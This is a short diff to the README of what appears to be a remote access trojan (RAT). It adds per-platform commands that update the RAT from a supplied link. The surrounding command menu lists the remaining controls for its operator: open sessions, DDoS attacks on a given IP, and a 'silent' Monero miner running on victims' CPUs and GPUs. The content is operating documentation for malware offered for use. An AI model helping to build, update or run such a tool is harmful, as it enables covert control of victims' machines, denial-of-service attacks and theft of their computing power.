@@ -25,7 +25,8 @@ bnt: @udbnt
 
 * !sessions                              (List open sessions)
 * !check                                 (Check miner & ddos status)
-* !update                                (Update RAT)
+* !updatelinux < LINK >                  (Update RAT on linux platforms) (input Client link)
+* !updatewin < LINK >                    (Update RAT on windows platforms) (input Client.exe link)
 * !ddos < IP >                           (Start DDoS Attack)
 * !stopddos                              (Stop DDoS)
 * !miner < WALLET >                      (Start slient XMR Crypto Miner CPU + AMD/INTEL GPU's)
